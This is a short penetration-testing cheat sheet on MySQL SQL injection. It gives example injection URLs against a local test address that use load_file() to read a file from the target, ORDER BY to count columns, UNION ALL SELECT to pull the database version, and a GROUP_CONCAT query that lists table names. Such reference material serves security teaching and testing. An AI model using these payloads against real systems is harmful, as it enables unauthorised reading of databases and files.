# MySQL Functions
This sheet serves as a list of functions to be leveraged during a successful MySQL SQL injection attack.
## LOAD_FILE()
We may be able to read files on the target file system using the MySQL `load_file()` function like so,
```
https://127.0.0.1/comments.php?id=1337 union all select 1,2,3,4,load_file("C:\users\username\Desktop\user.txt"), 6
```
Becareful about how you use single and double quotes. We must know where the file resides on the file system before attmpting to read it.
## ORDER BY
We can oftent use the SQL statement `ORDER BY` to gather how many columns the current database table has,
```
https://127.0.0.1/comments.php?id=1337 order by N
```
Keep increasing `N` in the above statment until we get an error, or instant HTTP request inthe case of a [Blind SQL Injection Attack](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/SQL%20Injection/sql-injection-blind.md).
## UNION ALL SELECT
The SQL statement `UNION ALL SELECT` can often be used after we get the column count to see which column we can injection nested statements and other data into. For instance, say that after we successfully perfomred an SQL Injection attack and got an `ORDER BY 7`, meaning `7` columns, we can then attempt the following to try to glean the database version by injecting a nested statement into one of the columns,
```
https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT @@version,1,1,1,1,1,1
https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,@@version,1,1,1,1,1
https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,1,@@version,1,1,1,1
https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,1,1,@@version,1,1,1
https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,1,1,1,@@version,1,1
https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,1,1,1,1,@@version,1
https://127.0.0.1/comments.php?id=1337 UNION ALL SELECT 1,1,1,1,1,1,@@version
```
This can easily be automated by scripting the process using `curl`.
## GROUP CONCAT
Group concatenation of records can be achieved using the `GROUP_CONCAT` stored procedure in MySQL,
```
MariaDB [security]> select group_concat(distinct table_name separator ', ') from information_schema.tables where table_schema = 'security';
+--------------------------------------------------+
| group_concat(distinct table_name separator ', ') |
+--------------------------------------------------+
| emails, referers, uagents, users                 |
+--------------------------------------------------+
1 row in set (0.00 sec)

```
This way, we can acheive all records as a single string for simple SQL injection of a given column.
